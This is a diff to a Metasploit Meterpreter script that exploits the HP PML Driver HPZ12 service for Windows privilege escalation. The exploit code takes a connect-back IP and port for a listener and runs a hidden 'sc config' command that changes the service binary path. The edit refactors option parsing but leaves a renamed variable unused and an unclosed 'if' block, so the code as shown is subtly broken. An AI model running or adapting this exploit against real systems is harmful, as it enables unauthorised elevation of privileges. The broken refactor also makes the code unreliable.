@@ -21,34 +21,40 @@
 #
 # Options
 #
-opts = Rex::Parser::Arguments.new(
-	"-h"  => [ false,  "This help menu"],
-	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back"],
-	"-p"  => [ true,   "The port on the remote host where Metasploit is listening"]
+@exec_opts = Rex::Parser::Arguments.new(
+	"-h"  => [ false,  "This help menu" ],
+	"-r"  => [ true,   "The IP of the system running Metasploit listening for the connect back" ],
+	"-p"  => [ true,   "The port on the remote host where Metasploit is listening" ]
 )
 
 #
 # Default parameters
 #
+rhost = nil
+rport = nil
 
-rhost = Rex::Socket.source_address("1.2.3.4")
-rport = 4444
+def usage
+	print_status("HP PML Driver HPZ12 SERVICE_CHANGE_CONFIG privilege escalation.")
+	print_line(@exec_opts.usage)
+	raise Rex::Script::Completed
+end
 
 #
 # Option parsing
 #
 opts.parse(args) do |opt, idx, val|
 	case opt
-	when "-h"
-		print_status("HP PML Driver HPZ12 SERVICE_CHANGE_CONFIG privilege escalation.")
-		print_line(opts.usage)
-		raise Rex::Script::Completed
-	when "-r"
-		rhost = val
-	when "-p"
-		rport = val.to_i
-	end
+		when "-r"
+			rhost = val
+		when "-p"
+			rport = val.to_i
+		else
+			usage
+		end
 end
+
+if rhost.nil? or rport.nil?
+	usage
 if client.platform =~ /win32|win64/
 	client.sys.process.get_processes().each do |m|
 		if ( m['name'] =~ /HPZipm12\.exe/ )
@@ -94,10 +100,9 @@ if client.platform =~ /win32|win64/
 			)
 
 			client.sys.process.execute("cmd.exe /c sc config \"Pml Driver HPZ12\" binpath= %SystemRoot%\\system32\\HPZipm12.exe", nil, {'Hidden' => 'true'})
-
 		end
 	end
 else
-	print_error("This version of Meterpreter is not supported with this Script!")
+	print_error("This version of Meterpreter is not supported with this script!")
 	raise Rex::Script::Completed
 end
